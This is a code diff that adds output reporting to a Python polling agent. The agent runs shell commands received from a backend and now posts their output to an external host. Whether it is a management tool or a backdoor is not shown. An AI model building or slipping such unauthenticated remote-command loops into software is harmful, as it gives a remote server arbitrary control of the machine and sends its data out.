@@ -27,7 +27,17 @@ def poll_for_commands():
                         result = subprocess.run(command, shell=True, capture_output=True, text=True)
                         output = result.stdout + result.stderr
                         print(f"[INFO] Command output: {output}")
-                        # Optionally, report result back to backend here
+                        # Report result back to backend
+                        try:
+                            report_url = "https://socket.valiantedgetech.com/api/command/report-output"
+                            report_payload = {
+                                "command_id": command_id,
+                                "output": output
+                            }
+                            report_resp = requests.post(report_url, json=report_payload, timeout=10)
+                            print(f"[INFO] Reported output: {report_resp.status_code} {report_resp.text}")
+                        except Exception as e:
+                            print(f"[ERROR] Failed to report output: {e}")
                     except Exception as e:
                         print(f"[ERROR] Command execution failed: {e}")
         except Exception as e:
